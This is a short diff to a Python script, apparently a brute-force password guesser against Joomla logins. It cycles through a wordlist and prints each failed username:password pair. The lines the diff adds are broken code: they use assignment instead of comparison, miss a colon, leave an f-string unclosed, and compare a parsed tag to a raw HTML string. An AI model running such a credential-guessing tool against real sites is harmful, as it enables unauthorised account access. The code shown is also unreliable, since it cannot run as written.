@@ -98,7 +98,8 @@ class Joomla:
             soup = BeautifulSoup(r.text, 'html.parser')
             response = soup.find('div', {'class': self.warning})
             print(f'Current Word #{processed_words}: {password}')
-            print(response)
+            if response = '<div class="alert alert-warning">Username and password do not match or you do not have an account yet.</div>'
+                print(f'FAILED password = {password})
 
 
 
@@ -110,7 +111,7 @@ class Joomla:
                 soup = BeautifulSoup(r.text, 'html.parser')
                 response_2ndtime = soup.find('div', {'class': self.warning})
                 print(f'Trying again on current Word #{processed_words}: {password}')
-                if response_2ndtime:
+                if response_2ndtime = '<div class="alert alert-warning">Username and password do not match or you do not have an account yet.</div>':
                     print('Oh well')
                     print(f'{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')
                 else:
